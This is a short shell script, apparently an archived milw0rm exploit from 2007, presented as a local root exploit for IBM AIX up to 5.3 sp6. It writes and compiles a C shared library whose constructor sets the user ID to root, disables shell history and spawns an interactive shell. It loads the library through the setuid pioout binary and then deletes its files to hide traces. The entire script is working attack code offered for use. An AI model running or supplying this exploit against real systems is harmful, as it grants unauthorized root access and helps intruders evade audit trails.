#!/bin/sh
#
# 07/2007: public release
# IBM AIX <= 5.3 sp6
#
echo "-------------------------------"
echo " AIX pioout Local Root Exploit "
echo " By qaaz"
echo "-------------------------------"
cat >piolib.c <<_EOF_
#include <stdlib.h>
#include <unistd.h>
void init() __attribute__ ((constructor));
void init()
{
	seteuid(0);
	setuid(0);
	putenv("HISTFILE=/dev/null");
	execl("/bin/bash", "bash", "-i", (void *) 0);
	execl("/bin/sh", "sh", "-i", (void *) 0);
	perror("execl");
	exit(1);
}
_EOF_
gcc piolib.c -o piolib -shared -fPIC
[ -r piolib ] && /usr/lpd/pio/etc/pioout -R ./piolib
rm -f piolib.c piolib

# milw0rm.com [2007-07-27]